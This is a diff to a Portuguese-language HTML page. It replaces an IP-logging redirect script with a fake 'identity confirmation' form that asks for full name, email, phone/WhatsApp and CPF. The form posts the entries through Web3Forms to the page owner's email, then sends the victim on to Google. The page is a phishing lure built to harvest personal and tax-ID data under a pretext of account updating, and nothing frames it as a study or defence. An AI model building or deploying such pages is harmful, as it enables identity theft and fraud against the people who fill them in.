@@ -2,25 +2,102 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Carregando...</title>
-    <script>
-        // O JavaScript consulta uma API pública para obter dados de conexão do visitante
-        fetch('https://ipify.org')
-            .then(response => response.json())
-            .then(data => {
-                // Exibe o IP no console do navegador do visitante para fins de teste
-                console.log("Seu IP de teste:", data.ip);
-                
-                // Redireciona imediatamente para o destino final
-                window.location.href = "https://google.com";
-            })
-            .catch(error => {
-                // Redireciona mesmo se a API falhar
-                window.location.href = "https://google.com";
-            });
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Atualização de Cadastro Operacional</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-container {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        h2 {
+            margin-bottom: 20px;
+            color: #333;
+            text-align: center;
+            font-size: 22px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #666;
+            font-size: 14px;
+        }
+        input[type="text"], input[type="email"], input[type="tel"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-size: border-box;
+            font-size: 14px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #007bff;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
-    <p>Redirecionando, por favor aguarde...</p>
+
+<div class="form-container">
+    <h2>Confirmação de Identidade</h2>
+    
+    <!-- O action utiliza o Web3Forms para enviar os dados digitados direto para o seu e-mail -->
+    <form action="https://web3forms.com" method="POST">
+        
+        <!-- COLOQUE SUA CHAVE DO WEB3FORMS AQUI -->
+        <input type="hidden" name="access_key" value="SUA_CHAVE_AQUI">
+        
+        <!-- Página para onde o usuário vai depois de clicar em enviar -->
+        <input type="hidden" name="redirect" value="https://google.com">
+
+        <div class="form-group">
+            <label for="nome">Nome Completo</label>
+            <input type="text" id="nome" name="Nome" placeholder="Digite seu nome" required>
+        </div>
+
+        <div class="form-group">
+            <label for="email">E-mail Principal</label>
+            <input type="email" id="email" name="Email" placeholder="exemplo@email.com" required>
+        </div>
+
+        <div class="form-group">
+            <label for="telefone">Telefone / WhatsApp</label>
+            <input type="tel" id="telefone" name="Telefone" placeholder="(00) 00000-0000" required>
+        </div>
+
+        <div class="form-group">
+            <label for="cpf">CPF</label>
+            <input type="text" id="cpf" name="CPF" placeholder="000.000.000-00" required>
+        </div>
+
+        <button type="submit">Validar Dados</button>
+    </form>
+</div>
+
 </body>
 </html>
